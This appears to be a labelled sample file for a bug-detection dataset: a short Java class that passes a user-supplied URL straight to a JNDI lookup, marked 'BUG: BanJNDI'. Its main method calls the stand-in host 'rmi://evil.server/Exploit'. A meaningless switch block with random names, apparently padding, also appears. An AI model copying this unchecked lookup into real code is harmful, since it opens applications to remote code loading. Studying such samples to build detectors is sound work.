import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        int llrgxemh = 0;switch  (llrgxemh) {case 1:char rsdpgbjg = 'z';break;default:short unyvzvct = 4332;break;}
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    
}

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}